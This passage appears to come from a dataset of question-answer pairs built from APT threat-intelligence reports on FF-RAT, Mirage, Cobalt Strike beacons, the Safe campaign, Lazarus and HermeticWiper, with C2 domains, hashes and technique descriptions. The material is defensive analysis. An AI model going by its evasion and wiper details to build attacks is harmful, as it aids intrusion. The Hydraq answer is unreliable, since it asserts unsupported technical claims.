.............................................................................................................................39\nFigure\t\n \u00a063: Trojan.FF-\u00ad\u2010RAT RC4 key example .............................................................................................................................................39\nFigure\t\n \u00a064: Trojan.FF-\u00ad\u2010RAT RC4 decrypted\t\n \u00a0configuration\t\n \u00a0file.....................................................................................................................39\nFigure\t\n  65: RC4\t\n  decrypted configuration file\t\n  with manually generated aPACK\t\n  header ...........................................................................40\nFigure\t\n  66: appack.exe\t\n  error message ......................................................................................................................................................40\nFigure\t\n  67: Disassembly of appack.exe .....................................................................................................................................................41\nFigure\t\n  68: Patching appack.exe ...............................................................................................................................................................41\nFigure\t\n \u00a069:RC4\t\n \u00a0decrypted and aPACK\t\n \u00a0decompressed Trojan.FF-\u00ad\u2010RAT configuration\t\n \u00a0file...........................................................................42\nQuestion: How does the FF-RAT Trojan encrypt and decode its beacons, and what tools or techniques can be used to detect and parse these beacons?",
    "output": "Answer: The FF-RAT Trojan uses RC4 encryption to encode its beacons. To decode these beacons, analysts need to understand the RC4 encryption algorithm and apply it correctly to the encoded data. Tools like the FF-RAT Detection Parser can be used to automate this process. This parser helps in identifying and decoding the beacons, making it easier for analysts to understand the communication patterns and commands sent by the malware. By using such tools, cybersecurity experts can efficiently detect and analyze FF-RAT activity within a compromised network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Identification of victims\nFrom May to the date of this publication, the CTU research team engaged in a sinkhol-ing operation. During the operation, several of the domains formerly used as part of the C2 infrastructure were taken over, and all activity to the domains was logged. The sink-holed domains were no longer in use and were freely available for registration.\nDuring the operation, CTU researchers were able to identify approximately 80 IP addresses regularly communicating to the sinkhole. After analyzing and decoding the requests, CTU researchers discovered that a subset of the observed systems had usernames such as \"admin\" or \"owner\", and the originating IP address resolved to either a residence or an antivirus or security company. Because these requests were most likely from behavioral testing on the malware sample, the CTU research team filtered these connections out of the results.\nAfter decoding the inbound requests, the CTU research team identified approximately 100-120 infected systems attempting to phone home. The majority of the inbound requests came from Taiwan or the Philippines, with several isolated cases in Nigeria, Brazil, Israel, Canada and Egypt. Many of the IP addresses originate from networks owned by the oil company, energy company, and military organization.\nDeeper analysis of the phone-home requests and correlation with social networking sites allowed CTU researchers to identify a specific individual infected with Mirage. It was an executive-level finance manager of the Phillipine-based oil company.\nBig Headline: Threat actors\nThe threat actors using Mirage have employed several tactics to attempt to hide their identities and their primary C2 servers. One of the common tactics is using dynamic domain name system (dDNS) domains for the callbacks to the C2 servers. dDNS providers (e.g., Dyndns.com) allow anyone to register for a free third-level domain (e.g., Checkip.-dyndns.org) and require only a valid email address, which is kept private.\nWhen investigating the DNS addresses of the C2 servers, CTU researchers identified several IP addresses of hosting companies based in the United States that are running HTran. HTran software is used to proxy connections from one system to another. In the past, it has been used to disguise the true C2 servers used by malware authors. In the CTU research team's (<http://www.secureworks.com/cyber-threat-intelligence/threats/htran/>)2011 analysis of HTran, the software's author was identified as a member of the Chinese hacker group HUC, the Honker Union of China.\nDespite efforts to operate anonymously, there were several clues that pointed to the true identities of the attackers. During an analysis of the phone-home activity, CTU researchers identified four unique second-level domains that were not connected to a dDNS provider. Two of these domains shared a common owner's email address, and two were previously flagged for suspicious activity.\nCTU researchers correlated 86% of the IP addresses the dDNS domains used in the phone-home request to IP addresses of subdomains belonging to domains owned by dnsjacks@yahoo.com. Of the remaining 14% that were not directly associated, CTU re-\nsearchers correlated 10% to IP ranges that resolved to subdomains owned by dnsjacks@yahoo.com.\nThis link between the IP addresses and the subdomains indicates that dnsjacks@yahoo.-com owns the dDNS domains. Using historical DNS records, CTU researchers were able to map each of the dDNS domains to a subdomain of a domain owned by dnsjacks@ya-hoo.com.\nIn the samples CTU researchers analyzed, the other domains associated with the phone-home activity are asia-online.us, india-videoer.com and Echosky.biz. The CTU research (<http://www.secureworks.com/cyber-threat-intelligence/threats/sindigoo/>)team previously flagged these domains in the and later in the Sin Digoo analysis. The analysis of the Sin Digoo affair indicated that jeno_1980@hotmail.-com and king@hotmail.com were connected. From the data the CTU research team has collected, indications point to dnsjacks@yahoo.com being either another alias or an associate of the actor referenced in the HTran and Sin Digoo analyses.\n\nHow did the CTU research team leverage sinkholing to identify victims of the Mirage campaign? What specific steps did they take to filter out irrelevant connections and what insights did they gain from this process?",
    "output": "A: The CTU research team conducted a sinkholing operation by taking over several domains formerly used as part of the Command and Control (C2) infrastructure. They logged all activity to these domains and identified approximately 80 IP addresses regularly communicating to the sinkhole. To filter out irrelevant connections, they analyzed and decoded the requests, identifying and excluding connections from usernames such as 'admin' or 'owner' that originated from residences or antivirus/security companies, as these were likely from behavioral testing on the malware sample. After filtering, they identified approximately 100-120 infected systems attempting to phone home, primarily from Taiwan and the Philippines, with isolated cases in other countries. Many of these IP addresses originated from networks owned by oil companies, energy companies, and military organizations. Deeper analysis of the phone-home requests and correlation with social networking sites allowed them to identify a specific individual infected with Mirage, an executive-level finance manager of a Philippine-based oil company.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Abstract\nTargeted attacks on civil society and non-governmental organizations have gone underreported despite the fact that these organizations have been shown to be frequent targets of these attacks. In this paper, we shed light on targeted malware attacks faced by these organizations by studying malicious e-mails received by 10 civil society organizations (the majority of which are from groups related to China and Tibet issues) over a period of 4 years.\nOur study highlights important properties of malware threats faced by these organizations with implications on how these organizations defend themselves and how we quantify these threats. We find that the technical sophistication of malware we observe is fairly low, with more effort placed on socially engineering the e-mail content. Based on this observation, we develop the Targeted Threat Index (TTI), a metric which incorporates both social engineering and technical sophistication when assessing the risk of malware threats. We demonstrate that this metric is more effective than simple technical sophistication for identifying malware threats with the highest potential to successfully compromise victims. We also discuss how education efforts focused on changing user behaviour can help prevent compromise. For two of the three Tibetan groups in our study simple steps such as avoiding the use of email attachments could cut document-based malware threats delivered through e-mail that we observed by up to 95%.\nMedium Headline: 2.1 Targeted Malware Overview\nTargeted malware are a category of attacks that are distinct from common spam, phishing, and financially motivated malware. Spam and mass phishing attacks are indiscriminate in the selection of targets and are directed to the largest number of users possible. Similarly, finan-cially motivated malware such as banking trojans seek to compromise as many users as possible to maximize the potential profits that can be made. The social engineering tactics and themes used by these kinds of attacks are generic and the attack vectors are sent in high volumes. By contrast targeted malware attacks are designed for specific targets, sent in lower volumes, and are motivated by the objective of stealing specific sensitive data from a target.\nTargeted malware attacks typically involve the following stages [24,66]:\nReconnaissance: During this stage attackers conduct research on targets including profiling systems, software, and information security defenses used to identify possible vulnerabilities and contextual information on personnel and activities to aid social engineering.\nDelivery: During this stage a vector for delivering the attack is selected. Common vectors include e-mails with malicious documents or links, or contacting targets through instant messaging services and using social engineering to send malware to them. Typically, a target of such an attack receives an e-mail, possibly appearing to be from someone they know, containing text that urges the user to open an attached document (or visit a website).\nCompromise: During this stage malicious code is executed on a target machine typically after a user initiated action such as opening a malicious document or link.\nCommand and Control: During this stage the infected host system establishes a communications channel to a command and control (C&C) server operated by the attackers. Once this channel has been established the attackers can issue commands and download further malware on to the system\nAdditional attacker actions: After a successful compromise is established, attackers can conduct a number of actions including ex-filtrating data from the infected host and transmitting it back to attackers through a process of encrypting, compressing, and transferring to a server\noperated by the attackers. Attackers may also use peripherals such as webcams and microphones to monitor users in real time. The infected host may also serve as a starting point to infect other machines on the network and seek out specific information or credentials.\nMedium Headline: 2.2 Targeted Malware and CSOs\nTargeted malware has become recognized by governments and businesses around the world as a serious political and corporate espionage threat. The United States government has been particularly vocal on the threat targeted malware enabled espionage poses. General Keith Alexander, current Director of the National Security Agency and Commander of United States Cyber Command has stated that the theft of US intellectual property through cyber espionage constitutes the \"greatest transfer of wealth in history\" [47]. Recent widely publicized targeted malware intrusions against Google, RSA, the New York Times and other high profile targets have raised public awareness around these attacks [20,44,48]\nDespite this increased attention, targeted malware is not a new problem, with over a decade of public reports on these kinds of attacks [66]. However, the majority of research on targeted malware is conducted by private security companies who typically focus on campaigns against industry and government entities. As a result, targeted attacks on civil society and non-governmental organizations have gone underreported despite the fact that these organizations have been shown to be frequently targeted by cyber espionage campaigns. In particular, communities related to ethnic minority groups in China including Tibetans, Uyghurs, and religious groups such as Falun Gong have been frequent targets of cyber espionage campaigns with reports dating back to at least 2002 [61].\nIn some cases, the same actors have been revealed to be targeting civil society groups, government and industry entities. A notable example of this was the 2009 report by the Citizen Lab, a research group at the University of Toronto, which uncovered the \"GhostNet\" cyber espionage network. GhostNet successfully compromised prominent organizations in the Tibetan community in addition to 1,295 hosts in 103 countries, including ministries of foreign affairs, embassies, international organizations, and news media [25]. The GhostNet case is not an isolated example, as other reports have shown CSOs (commonly Tibetan organizations) included as targets in campaigns that are also directed to a range of government and industry entities [8,26,28,29,54\u201356] Some of these reports include technical details on the CSO spe-cific attacks [26, 28,54, 55] while others note them as a target but do not address in detail [8,29,56].\nWhile the majority of documented targeted malware\ncampaigns against CSOs involve China and Tibet-related groups and potentially China-related attack operators [9\u201311, 23, 25, 26, 32, 61\u201365, 67, 68] , these kinds of attacks go beyond China. Recent research and news media have reported attacks against large human rights groups focused on multiple issues and countries [31, 46], and communities related to Syria [18] and Iran [37]. Researchers have also uncovered the use of commercial network intrusion products used to target activists from Bahrain [38], the United Arab Emirates [36], and journalists from Ethiopia [35].\nMedium Headline: 3.1 Study Participants\nWe recruited participants via three main channels: (1) an open call on our Web site, (2) outreach to organizations we had prior relationship with and (3) referrals from participating groups. As part of the study these groups agreed to share technical data (e.g., e-mails with suspicious attachments) and participate in interviews at the onset and end of the study. Their identity and any PII shared with us were kept strictly confidential.\nFor the purposes of our study, we focused on organizations with missions concerning the promotion or protection of human rights. For purposes of this study, \"human rights\" means any or all of the rights enumerated under the Universal Declaration of Human Rights [60], the International Covenant on Civil and Political Rights [58], and the International Covenant on Economic, Social and Cultural Rights [59]. We also considered organizations on a case by case basis that have a mission that does not directly implicate human rights, but who may nonetheless be targeted by politically motivated digital attacks because of work related to human rights issues (e.g., media organizations that report on human rights violations).\nIn total, 10 organizations participated in the study (summarized in Table 1). The majority of these groups work on China-related rights issues and five of these organizations focus specifically on Tibetan rights. The high rate of participation from China and Tibet-related human rights issues is due in part to our previous relationships with these communities and a significant interest and enthusiasm expressed by the groups. In addition to the China and Tibet-related groups, our study also includes\ntwo groups, Rights Group 1 and 2 that work on multiple human rights related issues in various countries.\nThe majority of organizations operate from small of-fices with less than 20 employees. Some organizations (China Group 2, Tibet Group 2) have no physical office and consist of small virtual teams collaborating remotely, often from home offices. Of these groups only two (China Group 1, China Group 3) have a dedicated system administrator on staff. Other groups (Tibet Groups 1-5; China Group 2) rely on volunteers or staff with related technical skills (e.g. Web development) to provide technical support. Rights Group 1 and Rights Group 2 are much larger organizations relative to the others in our sample. Both organizations have over 100 employees, multiple offices, dedicated IT teams, and enterprise level computing infrastructures.\nQuestion: What role does social engineering play in targeted malware attacks against CSOs? How can understanding this aspect help in designing effective defense strategies?",
    "output": "Answer: Social engineering plays a crucial role in targeted malware attacks against CSOs, as attackers place significant effort into crafting convincing and personalized email content to mislead users. Understanding this aspect is vital for designing effective defense strategies. By recognizing that the technical sophistication of malware is often low, CSOs can focus on education efforts aimed at changing user behaviors. Teaching users to identify suspicious emails, avoid opening attachments, and use tools to check links for malware can significantly reduce the risk of compromise. This approach is more cost-effective and practical for CSOs with limited resources.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary targets of APT34, and what are some of the countries most frequently targeted by this group?",
    "output": "APT34 primarily targets organizations worldwide, particularly those in the financial, government, energy, chemical, and telecommunications industries in the Middle East. The top countries targeted by APT34 include the United Arab Emirates, China, Jordan, and Saudi Arabia. Other countries in the Middle East, such as Qatar, Oman, Kuwait, Bahrain, Lebanon, and Egypt, are also considered targets, although not at the top of the group's list.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 1 Background\nRecently, ANTIY Labs detected an APT attack targeting some government agency in China. The Shellcode for communication is conducted depending on Beacon mode which is generated on the basis of automatic attack detection platform-Cobalt Strike. This kind of attack pattern disguising as non-malicious real file in the host of its target, it sending a network heartbeat package every 60 seconds, and it also send data information via the Cookie field, all these features of this attack pattern are designed to evade the detection of security software and the interception of firewall on the targeted host. Considering the relationship between this attack and Cobalt Strike platform, we name it as APT-TOCS (TOCS refers to Threat on Cobalt Strike.) for now.\nThe core step of APT-TOCS is downloading the script functionalities of Shellcode, which downloads a field of data into memory for operation by calling powershell.exe.The decrypted data is a field of executable Shellcode that is generated by Cobalt Strike (An automatic attack testing platform). After loading the script of Shellcode, the Analysis Group of ANTIY did a series of correlation analysis, then we found a PE program that maybe act as a guiding executable file in similar attacks. The loaded Shellcode script can be used to call command line to add a certain field of encrypted date into memory and run it. The decrypted date turns out to be executable Shellcode which is generated by Cobalt Strike. The related script can be loaded via the guiding PE program or vulnerability. This kind of attack pattern has several features which including running in memory, no hard disk writing operations, communicating via Beacon, multi-beacon communication is acceptable, and several Beacons can work simultaneously. Such attack can be launched without the support of vector file, in fact it depends on network projection and laterally move in the internal network as required conducting an attack. So, it will bring great difficulties to the forensic work. It is important to note that, all the Sandboxes we know are disabling to fight against this kind of attack.\nIt seems that the attack capability of APT-TOCS is close to that of APT-level. However, it relied on automatic attack testing platform instead of abilities of the attack team.\nAnswer this question: How does the APT-TOCS attack leverage Cobalt Strike to evade detection, and what specific techniques are employed to achieve this?",
    "output": "APT-TOCS leverages Cobalt Strike, an automatic attack testing platform, to generate Shellcode that disguises itself as a non-malicious real file within the target host. The attack sends a network heartbeat package every 60 seconds and transmits data information via the Cookie field. These techniques are designed to evade the detection of security software and the interception of firewalls on the targeted host. The Shellcode operates in memory, avoiding hard disk writing operations, and communicates via Beacon mode, allowing for multi-beacon communication and simultaneous operation of several Beacons. This approach makes the attack difficult to detect and forensically analyze, as it relies on network projection and lateral movement within the internal network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: TREND MICRO LEGAL DISCLAIMER\nThe information provided herein is for general information and educational purposes only. It is not intended and should not be construed to constitute legal advice. The information contained herein may not be applicable to all situations and may not reflect the most current situation. Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise. Trend Micro reserves the right to modify the contents of this document at any time without prior notice.\nTranslations of any material into other languages are intended solely as a convenience. Translation accuracy is not guaranteed nor implied. If any questions arise related to the accuracy of a translation, please refer to the original language official version of the document. Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes.\nAlthough Trend Micro uses reasonable efforts to include accurate and up-to-date information herein, Trend Micro makes no warranties or representations of any kind as to its accuracy, currency, or completeness. You agree that access to and use of and reliance on this document and the content thereof is at your own risk. Trend Micro disclaims all warranties of any kind, express or implied. Neither Trend Micro nor any party involved in creating, producing, or delivering this document shall be liable for any consequence, loss, or damage, including direct, indirect, special, consequential, loss of business profits, or special damages, whatsoever arising out of access to, use of, or inability to use, or in connection with the use of this document, or any errors or omissions in the content thereof. Use of this information constitutes acceptance for use in an \"as is\" condition.\nBig Headline: Attack Vector\nThe distribution mechanism the Safe campaign used involved spear-phishing emails that contain a malicious attachment. This technique, which is quite common for APT campaigns, encourages a recipient to open a malicious attachment by sending an email with contextually relevant content.1\nWe discovered several malicious documents that all exploited a Microsoft Office\u00ae vulnerability (i.e., CVE-2012-0158).2 If opened with a version of Microsoft Word\u00ae that is not up-to-date, a malicious payload is silently installed on the user's computer.\n1\n2\nIn addition to the Tibetan-themed attack vector, we found documents written in Mongolian though their exact targets remain unclear.\nMedium Headline: First Stage\nOpening the malicious document on a system running a vulnerable version of Microsoft Office opens the decoy document for the user to view. Note though that this also drops malicious files onto the system that allows the attackers to take control of it. After the initial compromise, the attackers may then steal files from the compromised system.\nThe decoy document, NBC Interview_Excerpts.doc, has the MD5 hash, a2da9cda33ce378a21f54e9f03f6c0c9efba61fa. It drops the following files:\n\u2022 smcs.exe (91e6277a70d48ed953ac9208275e5dc855a8f7a7), which contains:\n\u2022 SafeCredential.DAT (303e982d0929ca2c50809323dff66be38a46926a)\n\u2022 SafeExt.org (2029399fb4be3d88c2ba0a7544b1ebec58157639), which contains:\n\u2022 SafeExt.dll (cde35c8da8c420aeaf5adda14ba68d18010479fa)\nThe malware the malicious documents drop has several components, including:\n\u2022 SafeExt.dll: Contains the malware's main functionality.\n\u2022 SafeCredential.DAT: Contains the RC4 key, C&C information, and campaign \"mark.\"\nIf User Account Control (UAC) is active, SafeExt.dll will be injected into explorer.exe. Otherwise, the file is copied to %Program Files%\\Internet Explorer\\SafeNet\\ and registered as a Browser Helper Object (BHO).3\n3  and\nThe malware then accesses a C&C server over HTTP POST to send data using the domain name and URL path in SafeCredential.DAT. The network traffic is encrypted with the RC4 key in SafeCredential.DAT. One key indicator that can be used to detect this network communication is the user-agent, Fantasia.\nDuring our investigation of the C&C servers associated with Safe, we discovered a backup script that the attackers used to archive the files on them. This allowed us to acquire the source code for the .PHP files used on the C&C servers.\nThe data that the malware sends from a compromised host to report.php is decrypted by the C&C server and stored in a MySQL\u2122 database. In addition to RC4 encryption use, the file's content is XORed with the function in Figure 6.\nThe parameters of the query are unpacked and sent to a function that inserts the information the compromised host provides into the MySQL database. It then checks the database to see if the attackers specified instructions to send to the compromised host. If there are, these instructions are sent back to the compromised host.\nThe REQUEST_TYPE_CLIENT_REQUEST function inserts a unique ID for each compromised host as well as the Internet and external IP addresses, hostname, Windows domain, the system's disc drive information, and a campaign mark. It has a field to store information about any additional malware plug-ins that have been installed on the system.\nThe malware uses the following marks or campaign tags:\n\u2022 120713\n\u2022 120713p\n\u2022 123456\n\u2022 654321\n\u2022 c0814\n\u2022 C0821\n\u2022 L0821\n\u2022 Lewis120713px\n\u2022 N0911\n\u2022 Weber0720p\n\u2022 720p\n\u2022 L1224\nMedium Headline: Tools\nThe tools used by Safe are off-the-shelf programs that are able to extract saved passwords from Internet Explorer\u00ae (IE) and Mozilla Firefox\u00ae as well as any stored Remote Desktop Protocol (RDP) credentials.4\n4 The tools are publicly available at .\nWe found two sets of C&C servers that do not seem to have anything in common apart from being used in conjunction with the same malware. The first set of C&C servers had Mongolian-themed domain names\u2014mongolbaatar. us and mongolbaatarsonin.in. The second set of C&C servers use the domains, getapencil.com, which was registered with a privacy protection service, and withoutcake.com, which was registered by wanxian@126. com. 5 Willyoumarryadog.com may also be a C&C server but we have not yet discovered samples that use this domain name.\nThe Tibetan- and Mongolian-themed attack vectors described earlier are connected to the first infrastructure (i.e., mongolbaatar). We were unable to discover attack vectors for the second C&C infrastructure.\n5 A variety of services can be used so the registrant information required to register a domain name will not be publicly visible in the WHOIS directory.\nBig Headline: Campaign Connections\nOne of the C&C servers used, withoutcake.com, was registered using the email address, wanxian@126.com. This email address has been used to register 17 domain names, five of which have been confirmed to be C&C servers.\nThe domain, sugarsbutters.com, was used in attacks that leveraged images of Russian model, Irina Shayk, and dropped the iMuler malware that affects Mac OS X systems in November 2012.6 Three domains\u2014aq5u.org, prettyb0yinus. com, and shumetheme.org\u2014have also been used as C&C servers for campaigns using the Enfal malware.7\nBig Headline: Identification of Victims\nWe were able to identify victims in two ways. First, we were able to download a list of victims that were currently online from the C&C servers. Second, we were also able to download logs from the C&C servers that listed all of the IP addresses that \"checked in\" to them using the REQUEST_TYPE_CLIENT_ REQUEST function.\nThe first set of C&C servers (i.e., mongolbataar) appeared to have only three \"live\" victims\u2014one with an IP address assigned to South Sudan, another with an address assigned to Mongolia, and another that did not list an external IP address.\nThe logs we obtained from the first set of C&C servers showed that 243 unique IP addresses from 11 different countries checked in to them.\n6  and\n7  and\nThe logs we obtained from the second set of C&C servers (i.e., getapencil. com) showed that 11,563 unique IP addresses from 116 different countries checked in to them.\nTable 2: Top 15 Country Breakdown of Unique IP Address Locations\nWe discovered that on average, 71 victims accessed the getapencil.com C&C server at any given time. The actual total victim count was significantly lower than the number of unique IP addresses though.\nMedium Headline: DECRYPT.exe\nWe also pulled the application, DECRYPT.exe, from a getapencil. com C&C server. This application is a custom encrypter/decrypter for any file inputted into the application. Further analysis of this application shows that it uses large portions of Makoto Matsumoto and Takuji Nishimura's Random Number Generator (RNG) for encryption functionality.8\nOnce the Decrypt button is pressed, a password validation box appears.\nWe were able to identify victim files that were on \"drop servers\" that utilize DECRYPT.exe for encryption/ decryption.\nMedium Headline: Common Tools\nWe also identified security tools with both valid and nefarious purposes and have been used in other campaigns on the C&C servers. We listed some of these along with their functionality below:\n\u2022 LZ77: Used to compress and decompress files.\n\u2022 UPXShell: Commonly used to pack malware in order to make it more difficult for analysts to reverse-engineer.\n\u2022 DebugView: A Microsoft Sysinternals tool that allows you to monitor debug outputs on your local system.\n\u2022 Build.bat: Used to open TypeConfig and \"automate\" malware creation processes.\n\u2022 Compress.bat: Used to automatically compress files defined in a batch file with the aid of LZ77.exe.\n\u2022 PECompress.bat: Used to compress files identified in a batch file with the aid of UPXShell.exe.\n8\n\nAnswer this question based on the above context: What tools does the Safe campaign use to extract saved passwords and RDP credentials, and how are these tools distributed?",
    "output": "The Safe campaign uses off-the-shelf programs to extract saved passwords from Internet Explorer and Mozilla Firefox, as well as any stored Remote Desktop Protocol (RDP) credentials. These tools are publicly available. The campaign utilizes two sets of C&C servers, one with Mongolian-themed domain names and another with domains like getapencil.com and withoutcake.com, which are registered with privacy protection services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Win32/Hydraq APT use Adversary-in-the-Middle techniques to intercept and manipulate network traffic?",
    "output": "Adversary-in-the-Middle (AiTM) is a technique used by attackers to position themselves between two or more networked devices, allowing them to intercept and manipulate network traffic. In the case of the Win32/Hydraq APT, it uses AiTM techniques to intercept and manipulate network traffic. Specifically, the APT uses Command 0x04 Task 0x02 to open or execute a file or program, and Command 0x04 Task 0x08 to update network.ics content, which allows it to manipulate the routing table and redirect traffic to the compromised system. This enables the attacker to perform a man-in-the-middle attack, where they can intercept traffic and capture information. Additionally, the APT's ability to adjust token privileges and escalate privileges allows it to maintain its position in the network and continue to intercept and manipulate traffic. Furthermore, the APT's use of encryption and custom protocols makes it difficult to detect and analyze its network activity, making it an effective AiTM attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "North Korea's Lazarus APT leverages Windows Update client, GitHub in latest campaign\nblog.malwarebytes.com(<https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/>)/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign\nThreat Intelligence Team\nJanuary 27, 2022\nThis blog was authored by Ankur Saini and Hossein Jazi\nLazarus Group is one of the most sophisticated North Korean APTs that has been active since 2009. The group is responsible for many high profile attacks in the past and has gained worldwide attention. The (<https://twitter.com/h2jazi/status/1483521532433473536>)Malwarebytes Threat Intelligence team is actively monitoring its activities and was able to spot a new campaign on Jan 18th 2022.\nIn this campaign, Lazarus conducted spear phishing attacks weaponized with malicious documents that use their (<https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf>)known job opportunities theme. We identified two decoy documents masquerading as American global security and aerospace giant Lockheed Martin.\nIn this blog post, we provide technical analysis of this latest attack including a clever use of Windows Update to execute the malicious payload and GitHub as a command and control server. We have reported the rogue GitHub account for harmful content.\n\nBased on the above text, answer a question. How did the Lazarus Group leverage the Windows Update client and GitHub in their latest campaign, and what does this imply about their tactics and sophistication?",
    "output": "The Lazarus Group, a sophisticated North Korean APT active since 2009, conducted a new campaign in January 2022 where they employed spear phishing attacks using malicious documents disguised as job opportunities from Lockheed Martin. The campaign utilized the Windows Update client to execute the malicious payload, demonstrating a clever tactic to bypass traditional security measures. Additionally, they used GitHub as a command and control server, highlighting their ability to exploit legitimate platforms for malicious purposes. This approach indicates the group's advanced capabilities and their strategy to blend in with normal network traffic, making detection more challenging.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Conclusion\nAs we have seen for several years now, dissenting groups, especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction. In the digital age, a strategic web compromise (exploit drive-by) has become a key weapon of choice for to conduct such operations. These types of attacks are far from overt, as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website. In the case of this post, it appears that at least two different attackers were involved in compromising and placing malicious code on Pro-Democratic websites in Hong Kong. This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted. Unfortunately with the level of access and infrastructure the attackers appear to have, this is quite an uphill battle. Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success.\n\nQuestion: Why are strategic web compromises (exploit drive-bys) considered a key weapon of choice for surveillance and information extraction against dissenting groups? How does this method benefit the attackers, and what challenges do defenders face in mitigating these attacks?\n\nAnswer:",
    "output": "Strategic web compromises (exploit drive-bys) are considered a key weapon of choice for surveillance and information extraction because they are far from overt. Typically, the target and victim unwittingly visit what they believe to be a safe and trusted website, making it easier for attackers to execute their plans without raising immediate suspicion. This method benefits the attackers by allowing them to exploit the trust that users have in these websites, thereby increasing the likelihood of successful infection and data exfiltration. For defenders, mitigating these attacks is challenging due to the level of access and infrastructure the attackers possess. The covert nature of these attacks makes detection difficult, and the continuous exposure of new attack vectors requires constant vigilance and proactive measures to shine a light on these operations and reduce their success.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMoonlight \u2013 Targeted attacks in the Middle East\nPosted by (<http://blog.vectranetworks.com/blog/author/chris-doman>)Chris Doman on Oct 26, 2016 1:30:00 AM\nFind me on:\nVectra Threat Labs researchers have uncovered the activities of a group of individuals currently engaged in targeted attacks against entities in the Middle East. We identified over 200 samples of malware generated by the group over the last two years. These attacks are themed around Middle Eastern political issues and the motivation appears to relate to espionage, as opposed to opportunistic or criminal intentions.\nThese are not technically sophisticated attackers. However, they do deploy some novel tactics, detailed below, and the implications of these attacks could be significant. Both the tools and targets of Moonlight are reminiscent of \"Gaza Hacker Team,\" a group of attackers that are said to be politically aligned to the Hamas(<http://blog.vectranetworks.com/blog/moonlight-middle-east-targeted-attacks#_ftn1>)[1]. In spite of these commonalities, we have not identified any firm links between the two groups.\nWe refer to this group of attackers as Moonlight, after the name the attackers chose for one of their command-and-control domains.\n\nWhy did Vectra Threat Labs researchers classify the Moonlight group as politically motivated rather than criminally motivated? How does understanding the motivation behind an attack help cybersecurity experts in mitigating future threats?",
    "output": "Vectra Threat Labs researchers classified the Moonlight group as politically motivated due to the thematic focus of their attacks on Middle Eastern political issues and the apparent goal of espionage rather than financial gain. Understanding the motivation behind an attack is crucial for cybersecurity experts because it helps in predicting the types of targets and methods the attackers might use in the future. For example, knowing that Moonlight is driven by political motives allows defenders to prioritize the protection of sensitive political information and anticipate that the group might target organizations involved in political activities or diplomacy. This insight enables more effective threat modeling and resource allocation, thereby enhancing overall security posture.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nOn February 23rd, the threat intelligence community began observing a new wiper malware sample circulating in Ukrainian organizations.\nOur analysis shows a signed driver is being used to deploy a wiper that targets Windows devices, manipulating the MBR resulting in subsequent boot failure.\nThis blog includes the technical details of the wiper, dubbed HermeticWiper, and includes IOCs to allow organizations to stay protected from this attack.\nThis sample is actively being used against Ukrainian organizations, and this blog will be updated as more information becomes available.\nSentinelOne customers are (<https://youtu.be/keWfVA6F4IM>)protected from this threat, no action is needed.\nBig Headline: Technical Analysis\nAt first glance, HermeticWiper appears to be a custom-written application with very few standard functions. The malware sample is 114KBs in size and roughly 70% of that is composed of resources. The developers are using a tried and tested technique of wiper malware, abusing a benign partition management driver, in order to carry out the more damaging components of their attacks. Both the Lazarus Group () and APT33\n() took advantage of Eldos Rawdisk in order to get direct userland access to the filesystem without calling Windows APIs. HermeticWiper uses a similar technique by abusing a different driver, empntdrv.sys .\nHermeticWiper resources containing EaseUS Partition Manager drivers\nThe copies of the driver are ms-compressed resources. The malware deploys one of these depending on the OS version, bitness, and SysWow64 redirection.\nEaseUS driver resource selection\nThe benign EaseUS driver is abused to do a fair share of the heavy-lifting when it comes to accessing Physical Drives directly as well as getting partition information. This adds to the difficulty of analyzing HermeticWiper, as a lot of functionality is deferred to DeviceIoControl calls with specific IOCTLs.\nBig Headline: MBR and Partition Corruption\nHermeticWiper enumerates a range of Physical Drives multiple times, from 0-100. For each Physical Drive, the \\\\.\\EPMNTDRV\\ device is called for a device number.\nThe malware then focuses on corrupting the first 512 bytes, the Master Boot Record (MBR) for every Physical Drive. While that should be enough for the device not to boot again, HermeticWiper proceeds to enumerate the partitions for all possible drives.\nThey then differentiate between FAT and NTFS partitions. In the case of a FAT partition, the malware calls the same 'bit fiddler' to corrupt the partition. For NTFS, the HermeticWiper parses the Master File Table before calling this same bit fiddling function again.\nMFT parsing and bit fiddling calls\nWe euphemistically refer to the bit fiddling function in the interest of brevity. Looking through it, we see calls to Windows APIs to acquire a cryptographic context provider and generate random bytes. It's likely this is being used for an inlined crypto implementation and byte overwriting, but the mechanism isn't entirely clear at this time.\nAlong the way, HermeticWiper's more mundane operations provide us with further IOCs to monitor for. These include the momentary creation of the abused driver as well as a system service. It also modifies several registry keys, including setting the\nSYSTEM\\CurrentControlSet\\Control\\CrashControl CrashDumpEnabled key to 0, effectively disabling crash dumps before the abused driver's execution starts.\nDisabling CrashDumps via the registry\nFinally, the malware waits on sleeping threads before initiating a system shutdown, finalizing the malware's devastating effect.\nBig Headline: Conclusion\nAfter a week of defacements and increasing DDoS attacks, the proliferation of sabotage operations through wiper malware is an expected and regrettable escalation. At this time, we have a very small sliver of aperture into the attacks in Ukraine and subsequent spillover into neighboring countries and allies. If 